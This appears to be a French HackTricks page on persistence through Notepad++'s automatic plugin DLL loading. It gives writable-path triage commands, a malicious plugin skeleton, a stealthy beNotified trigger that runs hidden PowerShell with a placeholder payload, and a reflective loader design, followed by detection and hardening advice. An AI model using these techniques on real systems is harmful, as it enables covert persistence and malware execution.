# Persistance et exécution par chargement automatique d’un plugin Notepad++

{{#include ../../banners/hacktricks-training.md}}

Notepad++ va **charger automatiquement chaque DLL de plugin trouvée sous ses sous-dossiers `plugins`** au lancement. Déposer un plugin malveillant dans toute **installation Notepad++ inscriptible** donne de l’exécution de code dans `notepad++.exe` à chaque démarrage de l’éditeur, ce qui peut être abusé pour la **persistance**, une **initial execution** discrète, ou comme **in-process loader** si l’éditeur est lancé avec des privilèges élevés.

Depuis **Notepad++ 7.6+**, la disposition attendue pour l’installation manuelle est **un sous-dossier par plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **portable mode** (présence de `doLocalConf.xml` à côté de `notepad++.exe`), toute l’arborescence de l’application reste locale à ce répertoire, ce qui transforme souvent des bundles d’outils copiés/admin en une surface d’exécution facilement inscriptible par l’utilisateur.

## Emplacements de plugin inscriptibles
- Installation standard : `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (nécessite généralement les droits admin pour écrire).
- Options inscriptibles pour les opérateurs à faible privilège :
- Utiliser la **portable Notepad++ build** dans un dossier inscriptible par l’utilisateur.
- Copier `C:\Program Files\Notepad++` vers un chemin contrôlé par l’utilisateur (par ex. `%LOCALAPPDATA%\npp\`) et exécuter `notepad++.exe` depuis là.
- Rechercher des **admin tool bundles**, des copies de zip extraites, ou des toolkits de help-desk qui contiennent déjà `doLocalConf.xml` et résident en dehors de `Program Files`.
- Chaque plugin obtient son propre sous-dossier sous `plugins` et est chargé automatiquement au démarrage ; les entrées de menu apparaissent sous **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Points de chargement du plugin (primitives d’exécution)
Notepad++ attend des **fonctions exportées** spécifiques. Elles sont toutes appelées pendant l’initialisation, offrant plusieurs surfaces d’exécution :
- **`DllMain`** — s’exécute immédiatement au chargement du DLL (premier point d’exécution).
- **`setInfo(NppData)`** — appelée une fois au chargement pour fournir les handles de Notepad++; emplacement typique pour enregistrer des éléments de menu.
- **`getName()`** — renvoie le nom du plugin affiché dans le menu.
- **`getFuncsArray(int *nbF)`** — renvoie les commandes du menu ; même si elle est vide, elle est appelée au démarrage.
- **`beNotified(SCNotification*)`** — reçoit les événements Notepad++ / Scintilla (utile pour différer des payloads jusqu’à une action utilisateur ou un événement de l’éditeur).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestionnaire de messages, utile pour des échanges de données plus volumineux.
- **`isUnicode()`** — indicateur de compatibilité vérifié au chargement.

La plupart des exports peuvent être implémentés comme des **stubs** ; l’exécution peut se faire depuis `DllMain` ou n’importe quel callback ci-dessus pendant l’autoload.

## Squelette minimal de plugin malveillant
Compilez un DLL avec les exports attendus et placez-le dans `plugins\\MyNewPlugin\\MyNewPlugin.dll` dans un dossier Notepad++ inscriptible :
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compilez le DLL (Visual Studio/MinGW).
2. Créez le sous-dossier du plugin sous `plugins` et déposez-y le DLL.
3. Redémarrez Notepad++; le DLL est chargé automatiquement, exécutant `DllMain` et les callbacks suivants.

## Schéma de déclenchement à faible bruit via `beNotified`
Pour l'OPSEC, de nombreux payloads ne devraient **pas** se déclencher depuis `DllMain`. Un schéma plus discret consiste à laisser le plugin se charger proprement, puis à exécuter seulement après un événement réaliste de l'éditeur comme **startup complete**, **buffer activation**, ou le **premier caractère tapé**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Cela correspond mieux à la recherche offensive publique qu’à un beacon `DllMain` bruyant : la DLL est toujours autoloadée au démarrage, mais l’action malveillante est retardée jusqu’à ce que Notepad++ semble réellement en cours d’utilisation.

## Using the plugin config directory as secondary storage
Notepad++ expose `NPPM_GETPLUGINSCONFIGDIR`, qui renvoie le **répertoire de configuration des plugins de l’utilisateur actuel**. Un plugin malveillant peut l’utiliser pour garder la DLL sur disque minimale tout en stockant la config chiffrée, des payloads staged ou des fichiers de tasking dans un chemin qui se fond dans l’état normal des plugins.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Opérationnellement, cela est utile lorsque vous voulez :
- un petit bootstrap DLL autoloadé ;
- du tasking par utilisateur sans toucher à nouveau le binaire principal du plugin ;
- séparer le **autoload trigger** de la seconde étape plus lourde.

## Reflective loader plugin pattern
Un plugin weaponized peut transformer Notepad++ en **reflective DLL loader** :
- Présenter une interface/menu minimal (par ex., "LoadDLL").
- Accepter un **file path** ou une **URL** pour récupérer un payload DLL.
- Mapper de façon reflective le DLL dans le processus courant et invoquer un point d’entrée exporté (par ex., une fonction loader à l’intérieur du DLL récupéré).
- Avantage : réutiliser un processus GUI d’apparence bénigne au lieu de lancer un nouveau loader ; le payload hérite de l’intégrité de `notepad++.exe` (y compris les contextes élevés).
- Compromis : déposer sur le disque un **unsigned plugin DLL** est bruyant ; une variation pratique consiste à n’utiliser le plugin autoloadé que comme stub et à garder le vrai implant chiffré/staged ailleurs.

## Detection and hardening notes
- Bloquer ou surveiller les **writes to Notepad++ plugin directories** (y compris les copies portables dans les profils utilisateur) ; activer controlled folder access ou application allowlisting.
- Alerter sur les **new unsigned DLLs** dans `plugins`, les modifications des arbres Notepad++ portables, et les **child processes/network activity** inhabituels depuis `notepad++.exe`.
- Établir une baseline des plugins légitimes et enquêter sur tout nouveau DLL qui exporte l’interface normale de plugin Notepad++ mais lance aussi des shells, PowerShell, ou des network beacons.
- Imposer l’installation des plugins via **Plugins Admin** uniquement, et restreindre l’exécution des copies portables depuis des chemins non approuvés.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
